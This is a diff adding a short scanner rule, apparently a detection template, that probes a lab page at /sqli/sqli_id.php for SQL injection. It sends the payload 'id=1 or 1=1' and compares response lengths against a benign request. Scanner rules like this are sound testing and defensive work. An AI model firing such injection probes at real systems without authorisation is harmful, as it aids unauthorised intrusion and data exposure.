@@ -1,0 +1,19 @@
+name: sqli_id
+rules:
+  - method: POST
+    path: /sqli/sqli_id.php
+    follow_redirects: false
+    body: id=1 or 1=1 &submit=%E6%9F%A5%E8%AF%A2
+    expression: response.status==200 && lengthDiff sqli_id
+  - method: POST
+    path: /sqli/sqli_id.php
+    follow_redirects: false
+    body: id=1&submit=%E6%9F%A5%E8%AF%A2
+    expression: response.status==200 && lengthDiff sqli_id
+
+detail:
+  type: sqldet
+  paramkey: id
+  payload: 1 or 1=1 &submit=%E6%9F%A5%E8%AF%A2
+
+
